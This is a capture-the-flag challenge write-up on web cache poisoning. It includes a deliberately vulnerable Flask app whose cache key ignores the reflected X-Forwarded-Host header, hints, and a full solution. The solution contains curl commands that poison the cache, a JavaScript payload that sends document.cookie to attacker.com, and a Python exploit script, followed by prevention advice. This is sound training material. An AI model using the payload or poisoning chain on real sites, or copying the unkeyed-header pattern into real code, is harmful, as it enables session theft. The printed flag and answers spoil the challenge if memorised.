# Challenge 07 - Web Cache Poisoning

**Category:** Web
**Difficulty:** Intermediate
**Points:** 300
**Target:** Custom Web Application with Cache

## Challenge Description

A web application uses caching to improve performance. However, the developers made a critical mistake in how they handle cache keys and user input.

Your mission is to exploit the web cache poisoning vulnerability to store a malicious response in the cache, which will then be served to other users (including the admin who will visit the page).

## Objectives

- Understand how web caching works
- Identify cache key components
- Find unkeyed inputs that affect the response
- Poison the cache with malicious content
- Steal the admin's session or trigger XSS

## Target Information

- **URL:** http://localhost:8888
- **Application:** Custom Flask app with cache
- **Cache Type:** Redis-based response cache
- **Admin Bot:** Visits /dashboard every 30 seconds

## Getting Started

1. Create the vulnerable application:

```python
#!/usr/bin/env python3
"""Vulnerable Web Cache Application"""

from flask import Flask, request, make_response, render_template_string
import redis
import hashlib
import time

app = Flask(__name__)
cache = redis.Redis(host='localhost', port=6379, db=0)

# Simplified cache duration
CACHE_DURATION = 60

def get_cache_key(path):
    """VULNERABLE: Cache key only includes path, not headers"""
    return f"cache:{path}"

def get_cached_response(path):
    key = get_cache_key(path)
    return cache.get(key)

def set_cached_response(path, response):
    key = get_cache_key(path)
    cache.setex(key, CACHE_DURATION, response)

@app.route('/')
def index():
    cached = get_cached_response('/')
    if cached:
        return cached.decode()

    # VULNERABLE: X-Forwarded-Host header reflected in response
    host = request.headers.get('X-Forwarded-Host', request.host)

    response = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cache Demo</title>
        <script src="https://{host}/static/analytics.js"></script>
    </head>
    <body>
        <h1>Welcome to the Cache Demo</h1>
        <p>This page is cached for performance.</p>
        <a href="/dashboard">Go to Dashboard</a>
    </body>
    </html>
    '''

    set_cached_response('/', response)
    return response

@app.route('/dashboard')
def dashboard():
    cached = get_cached_response('/dashboard')
    if cached:
        return cached.decode()

    # VULNERABLE: X-Forwarded-Host used in resource loading
    host = request.headers.get('X-Forwarded-Host', request.host)

    # Check for admin cookie
    is_admin = request.cookies.get('admin_token') == 'super_secret_admin_token'

    response = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard</title>
        <link rel="stylesheet" href="https://{host}/static/style.css">
    </head>
    <body>
        <h1>Dashboard</h1>
        {'<p>Admin Flag: FLAG{c4ch3_p01s0n1ng_succ3ss}</p>' if is_admin else '<p>Regular user view</p>'}
        <img src="https://{host}/static/logo.png" alt="Logo">
    </body>
    </html>
    '''

    set_cached_response('/dashboard', response)
    return response

@app.route('/admin-bot')
def admin_bot():
    """Simulates admin visiting the dashboard"""
    # In real scenario, this would be a headless browser
    return "Admin bot would visit /dashboard with admin cookie"

@app.route('/clear-cache')
def clear_cache():
    cache.flushdb()
    return "Cache cleared"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)
```

2. Start Redis:
   ```bash
   docker run -d -p 6379:6379 redis
   ```

3. Run the application:
   ```bash
   pip install flask redis
   python vulnerable_cache_app.py
   ```

---

## Hints

<details>
<summary>Hint 1 (Cost: -30 points)</summary>

Web caches typically use the URL path and some headers as the cache key. But if a header affects the response but isn't part of the cache key, you can poison the cache!

Common unkeyed inputs:
- `X-Forwarded-Host`
- `X-Forwarded-Scheme`
- `X-Original-URL`
- `X-Rewrite-URL`

Test which headers are reflected in the response but not in the cache key.

</details>

<details>
<summary>Hint 2 (Cost: -40 points)</summary>

The application reflects the `X-Forwarded-Host` header in script/resource URLs.

Try:
```bash
curl -H "X-Forwarded-Host: attacker.com" http://localhost:8888/
```

If the response includes `https://attacker.com/static/...` and gets cached, all subsequent visitors will load resources from your server!

</details>

<details>
<summary>Hint 3 (Cost: -60 points)</summary>

1. Clear the cache first: `curl http://localhost:8888/clear-cache`

2. Poison the cache with your evil host:
   ```bash
   curl -H "X-Forwarded-Host: evil.attacker.com" http://localhost:8888/dashboard
   ```

3. Verify the poisoned response is cached:
   ```bash
   curl http://localhost:8888/dashboard
   ```

4. Set up a server at evil.attacker.com to serve malicious JavaScript that steals cookies or redirects to your server.

The admin bot will load your malicious JS when visiting the dashboard!

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Understand the Cache Behavior

Test the normal application:
```bash
# First request - generates and caches response
curl -v http://localhost:8888/

# Second request - served from cache (check headers)
curl -v http://localhost:8888/
```

Look for cache-related headers like `X-Cache: HIT` or `Age`.

### Step 2: Identify Unkeyed Inputs

Test various headers to see which affect the response:

```bash
# Test X-Forwarded-Host
curl -H "X-Forwarded-Host: test.evil.com" http://localhost:8888/

# Check if reflected in response
# Look for: <script src="https://test.evil.com/static/analytics.js">
```

The `X-Forwarded-Host` header is reflected but not part of the cache key!

### Step 3: Clear the Cache

```bash
curl http://localhost:8888/clear-cache
```

### Step 4: Poison the Cache

```bash
# Poison with attacker-controlled host
curl -H "X-Forwarded-Host: attacker.com" http://localhost:8888/dashboard

# Response now contains:
# <link rel="stylesheet" href="https://attacker.com/static/style.css">
# <img src="https://attacker.com/static/logo.png" alt="Logo">
```

### Step 5: Verify Cache Poisoning

```bash
# Request without the header - should get poisoned response
curl http://localhost:8888/dashboard

# If you see attacker.com in the response, cache is poisoned!
```

### Step 6: Set Up Malicious Server

Create a malicious JavaScript file on your server:

```javascript
// analytics.js on attacker.com
// Steal cookies and send to attacker
var img = new Image();
img.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);

// Or redirect to phishing page
// window.location = 'https://attacker.com/phishing';
```

### Step 7: Wait for Admin

When the admin bot visits the cached `/dashboard` page, it will:
1. Receive the poisoned response from cache
2. Load the malicious script from `attacker.com`
3. Execute the JavaScript (stealing cookies)

### Step 8: Capture the Flag

If you intercept the admin's session token via your malicious JS:
```
GET /steal?cookie=admin_token=super_secret_admin_token
```

Use this token to access the dashboard as admin:
```bash
curl -b "admin_token=super_secret_admin_token" http://localhost:8888/dashboard
```

Output includes: `FLAG{c4ch3_p01s0n1ng_succ3ss}`

### Python Exploitation Script

```python
#!/usr/bin/env python3
"""Web Cache Poisoning Exploit"""

import requests
import time

TARGET = "http://localhost:8888"
ATTACKER_HOST = "attacker.com"

def clear_cache():
    """Clear the target's cache"""
    r = requests.get(f"{TARGET}/clear-cache")
    print(f"[*] Cache cleared: {r.text}")

def poison_cache(path):
    """Poison the cache for a specific path"""
    headers = {
        "X-Forwarded-Host": ATTACKER_HOST
    }
    r = requests.get(f"{TARGET}{path}", headers=headers)

    if ATTACKER_HOST in r.text:
        print(f"[+] Successfully poisoned cache for {path}")
        return True
    else:
        print(f"[-] Failed to poison cache for {path}")
        return False

def verify_poisoning(path):
    """Verify the cache is poisoned"""
    r = requests.get(f"{TARGET}{path}")

    if ATTACKER_HOST in r.text:
        print(f"[+] Cache poisoning verified for {path}")
        print(f"[+] Victims will load resources from: {ATTACKER_HOST}")
        return True
    else:
        print(f"[-] Cache not poisoned (or expired)")
        return False

def main():
    print("[*] Web Cache Poisoning Exploit")
    print(f"[*] Target: {TARGET}")
    print(f"[*] Attacker Host: {ATTACKER_HOST}")
    print()

    # Step 1: Clear cache
    clear_cache()
    time.sleep(1)

    # Step 2: Poison the cache
    for path in ['/', '/dashboard']:
        poison_cache(path)
        verify_poisoning(path)
        print()

    print("[*] Now wait for victims to visit the poisoned pages!")
    print("[*] Set up your malicious server to capture their data.")

if __name__ == '__main__':
    main()
```

### Cache Key Analysis

| Component | In Cache Key? | Exploitable? |
|-----------|--------------|--------------|
| URL Path | Yes | No |
| Query String | Usually | Depends |
| Host Header | Usually | No |
| X-Forwarded-Host | Often No | Yes! |
| User-Agent | Usually No | Sometimes |
| Cookie | Usually No | Yes (if reflected) |

### Web Cache Poisoning Variants

1. **Unkeyed Header**: Header affects response but not cache key
2. **Unkeyed Query Parameter**: Parameter not in cache key
3. **Cache Key Normalization**: Different URLs map to same key
4. **Response Splitting**: Inject additional responses
5. **Cache Deception**: Trick cache into storing sensitive data

### Prevention

```python
# Secure cache key implementation
def get_cache_key(request):
    """Include all inputs that affect response in cache key"""
    key_parts = [
        request.path,
        request.headers.get('X-Forwarded-Host', ''),
        request.headers.get('X-Forwarded-Proto', ''),
    ]
    return hashlib.sha256('|'.join(key_parts).encode()).hexdigest()

# Or better - don't reflect user input in cached responses
def safe_response():
    """Use server's canonical host, not user-provided"""
    canonical_host = "example.com"  # Configured, not from request
    return f'<script src="https://{canonical_host}/app.js"></script>'
```

### Detecting Cache Poisoning

1. **Cache Buster**: Add unique query param to bypass cache
2. **Response Comparison**: Compare cached vs fresh responses
3. **Header Analysis**: Check which headers are in Vary header
4. **Timing Analysis**: Cached responses are faster

</details>

---

## Flag

```
FLAG{c4ch3_p01s0n1ng_succ3ss}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- Understanding web caching mechanisms
- HTTP header manipulation
- Cache key analysis
- Exploit chain development
- Setting up attacker infrastructure

## Tools Used

- curl
- Burp Suite
- Python requests
- Local web server

## Related Challenges

- [02 - JWT Vulnerabilities (Intermediate)](02-jwt-vulnerabilities.md) - Token attacks
- [08 - Race Condition (Intermediate)](08-race-condition.md) - Timing attacks

## References

- [PortSwigger - Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [HTTP Cache Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching)
